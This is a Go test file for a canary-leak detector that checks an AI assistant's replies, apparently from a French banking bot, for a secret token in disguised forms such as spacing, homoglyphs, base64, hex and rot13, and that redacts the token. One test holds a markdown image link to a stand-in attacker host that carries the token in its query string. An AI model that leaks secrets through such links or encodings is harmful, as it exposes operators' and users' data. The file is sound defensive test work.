package promptguard

import (
	"encoding/base64"
	"encoding/hex"
	"strings"
	"testing"
)

const token = "MRD-4417-KESTREL-92"

func inspect(text string) ResponseResult {
	return InspectResponseWith(text, ResponseOptions{Canaries: []string{token}})
}

func TestCanary_ClearAndDisguised(t *testing.T) {
	cases := map[string]string{
		"exact":       "Bien sûr, le jeton est MRD-4417-KESTREL-92.",
		"lowercase":   "le jeton est mrd-4417-kestrel-92",
		"spaced":      "M R D - 4 4 1 7 - K E S T R E L - 9 2",
		"dotted":      "M.R.D.4.4.1.7.K.E.S.T.R.E.L.9.2",
		"invisible":   "MRD​-4417​-KES​TREL-92",
		"homoglyph":   "МRD-4417-КESTREL-92", // Cyrillic М and К
		"fullwidth":   "ＭＲＤ-4417-ＫＥＳＴＲＥＬ-92",
		"reversed":    "29-LERTSEK-7144-DRM",
		"rot13":       rot13(token),
		"base64":      base64.StdEncoding.EncodeToString([]byte(token)),
		"hex":         hex.EncodeToString([]byte(token)),
		"in-sentence": "Voici un exemple factice : MRD-4417-KESTREL-92, ne l'utilisez pas.",
	}
	for name, text := range cases {
		r := inspect(text)
		if r.Risk < CanaryWeight || len(r.Canaries) == 0 {
			t.Errorf("%s: canary missed, risk=%.2f hits=%v", name, r.Risk, r.Canaries)
			continue
		}
		if r.Canaries[0].Index != 1 {
			t.Errorf("%s: index = %d", name, r.Canaries[0].Index)
		}
	}
}

func TestCanary_FormIsReported(t *testing.T) {
	for form, text := range map[string]string{
		"exact":    token,
		"reversed": reverseRunes(token),
		"rot13":    rot13(token),
		"base64":   base64.StdEncoding.EncodeToString([]byte(token)),
		"hex":      hex.EncodeToString([]byte(token)),
	} {
		r := inspect("valeur : " + text)
		if len(r.Canaries) != 1 || r.Canaries[0].Form != form {
			t.Errorf("%s: hits = %v", form, r.Canaries)
		}
	}
}

func TestCanary_Fragment(t *testing.T) {
	r := inspect("Je ne peux pas tout dire, mais ça commence par MRD-4417-K…")
	if len(r.Canaries) != 1 || r.Canaries[0].Form != "fragment" {
		t.Fatalf("fragment not found: %+v", r)
	}
	if r.Risk < CanaryFragmentWeight || r.Risk >= CanaryWeight {
		t.Errorf("fragment risk = %.2f", r.Risk)
	}
	// Half the value is needed: a short piece is not a leak.
	if r := inspect("Le mot kestrel désigne un faucon."); len(r.Canaries) != 0 {
		t.Errorf("short piece flagged: %+v", r.Canaries)
	}
}

func TestCanary_HonestAnswersAreClean(t *testing.T) {
	for _, text := range []string{
		"Je ne peux pas partager ma configuration.",
		"Votre virement SEPA de 4417 € a été exécuté le 12.",
		"Cette demande sort de mon périmètre. Puis-je vous aider sur une question bancaire ?",
		"",
	} {
		if r := inspect(text); len(r.Canaries) != 0 || r.Risk != 0 {
			t.Errorf("%q flagged: %+v", text, r)
		}
	}
}

func TestCanary_MultipleAndIndexes(t *testing.T) {
	r := InspectResponseWith("second: SECRET-BETA-77", ResponseOptions{Canaries: []string{"ALPHA-0001-X", "SECRET-BETA-77"}})
	if len(r.Canaries) != 1 || r.Canaries[0].Index != 2 {
		t.Errorf("hits = %v", r.Canaries)
	}
}

func TestCanary_RedactionKeepsTheRest(t *testing.T) {
	text := "Bien sûr ! Le jeton est M-R-D-4417-KESTREL-92, et en base64 " + base64.StdEncoding.EncodeToString([]byte(token)) + ". Autre chose ?"
	r := inspect(text)
	out, changed := Redact(text, r)
	if !changed {
		t.Fatal("not redacted")
	}
	if strings.Contains(out, "4417") || strings.Contains(out, "KESTREL") || strings.Contains(out, "TVJE") {
		t.Errorf("value survives redaction: %q", out)
	}
	if !strings.HasPrefix(out, "Bien sûr ! Le jeton est [donnée retirée], et en base64 [donnée retirée]. Autre chose ?") {
		t.Errorf("redaction damaged the text: %q", out)
	}
	// Redacting again is a no-op.
	if r2 := inspect(out); len(r2.Canaries) != 0 {
		t.Errorf("redacted text still flagged: %v", r2.Canaries)
	}
}

func TestCanary_RedactionInsideExfilURLGoesWithTheURL(t *testing.T) {
	text := "![p](https://evil.example/c?data=" + token + "AAAAAAAAAA)"
	r := inspect(text)
	kinds := strings.Join(r.Kinds(), ",")
	if !strings.Contains(kinds, "canary") || !strings.Contains(kinds, "exfil_url") {
		t.Fatalf("kinds = %s", kinds)
	}
	out, _ := Redact(text, r)
	if out != "[lien retiré]" {
		t.Errorf("out = %q", out)
	}
}

func TestValidCanaries(t *testing.T) {
	kept, dropped := ValidCanaries([]string{" MRD-4417 ", "", "ab", "-x-y-", "ok42"})
	if len(kept) != 2 || kept[0] != "MRD-4417" || kept[1] != "ok42" {
		t.Errorf("kept = %v", kept)
	}
	if len(dropped) != 2 || dropped[0] != 3 || dropped[1] != 4 {
		t.Errorf("dropped = %v", dropped)
	}
}

func TestCanary_LargeAnswerIsFast(t *testing.T) {
	big := strings.Repeat("Une phrase bancaire ordinaire avec des chiffres 1234 et des mots. ", 300)
	r := InspectResponseWith(big+token, ResponseOptions{Canaries: []string{token, "AUTRE-9999-VALEUR"}})
	if len(r.Canaries) != 1 {
		t.Errorf("hits = %v", r.Canaries)
	}
}
